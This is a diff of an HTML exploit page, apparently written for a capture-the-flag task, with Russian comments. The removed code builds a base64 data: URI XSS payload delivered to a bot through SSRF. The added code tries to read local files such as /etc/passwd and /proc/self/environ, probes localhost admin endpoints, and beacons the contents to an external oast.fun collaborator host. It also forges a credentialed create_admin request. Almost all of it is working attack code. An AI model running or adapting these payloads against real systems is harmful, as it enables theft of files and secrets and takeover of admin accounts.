@@ -2,52 +2,70 @@
 <html>
 <body>
 <script>
-const TARGET = 'https://tasks.goidactf.ru:20499';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// Отправляем бота на data: URI с XSS
-const xssPayload = `
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-// Этот код выполнится в контексте data: URI (origin null)
-// Пробуем сделать запрос к create_admin
+// 1. Пробуем читать локальные файлы
+const filesToRead = [
+    'file:///etc/passwd',
+    'file:///etc/hosts', 
+    'file:///proc/self/environ',
+    'file:///flag',
+    'file:///app/flag.txt',
+    'file:///home/flag',
+    'file:///var/www/html/flag.txt'
+];
 
-// Метод 1: Form
-const form = document.createElement('form');
-form.method = 'POST';
-form.action = '${TARGET}/create_admin';
-form.innerHTML = '<input name="new_admin_login" value="DATA_URI_XSS">';
-document.body.appendChild(form);
-form.submit();
-
-// Метод 2: Fetch с credentials
-fetch('${TARGET}/create_admin', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    credentials: 'include',
-    body: 'new_admin_login=FETCH_FROM_DATA_URI'
+filesToRead.forEach(file => {
+    setTimeout(() => {
+        fetch(file)
+            .then(r => r.text())
+            .then(data => {
+                // Отправляем данные на collaborator
+                new Image().src = `${COLLAB}/?file=${encodeURIComponent(file)}&data=${encodeURIComponent(data.substring(0, 2000))}`;
+            })
+            .catch(e => {
+                new Image().src = `${COLLAB}/?file=${encodeURIComponent(file)}&error=${encodeURIComponent(e.toString())}`;
+            });
+    }, Math.random() * 3000);
 });
 
-// Отправляем сигнал
-new Image().src = '${COLLAB}/?from_data_uri=executed';
-<\/script>
-</body>
-</html>`;
+// 2. Пробуем получить доступ к localhost
+const localEndpoints = [
+    'http://localhost/admin',
+    'http://127.0.0.1/admin',
+    'http://localhost:80/admin',
+    'http://localhost:3000/',
+    'http://localhost:8080/'
+];
 
-// Кодируем в base64 для data: URI
-const base64Payload = btoa(xssPayload);
-const dataUri = 'data:text/html;base64,' + base64Payload;
-
-// Отправляем боту через SSRF
-fetch(TARGET + '/get_url', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({url: dataUri})
-}).then(r => {
-    new Image().src = COLLAB + '/?ssrf_sent=yes';
+localEndpoints.forEach(url => {
+    setTimeout(() => {
+        fetch(url)
+            .then(r => r.text())
+            .then(data => {
+                new Image().src = `${COLLAB}/?local=${encodeURIComponent(url)}&data=${encodeURIComponent(data.substring(0, 1500))}`;
+            })
+            .catch(e => {
+                new Image().src = `${COLLAB}/?local=${encodeURIComponent(url)}&error=${encodeURIComponent(e.message)}`;
+            });
+    }, Math.random() * 5000 + 3000);
 });
+
+// 3. Пробуем создать админа на целевом сайте (если куки есть)
+setTimeout(() => {
+    fetch('https://tasks.goidactf.ru:20499/create_admin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        credentials: 'include',
+        body: 'new_admin_login=GITHUB_PAGES_EXPLOIT'
+    })
+    .then(r => {
+        new Image().src = `${COLLAB}/?create_admin_status=${r.status}`;
+    })
+    .catch(e => {
+        new Image().src = `${COLLAB}/?create_admin_error=${encodeURIComponent(e.toString())}`;
+    });
+}, 8000);
 </script>
 </body>
 </html>
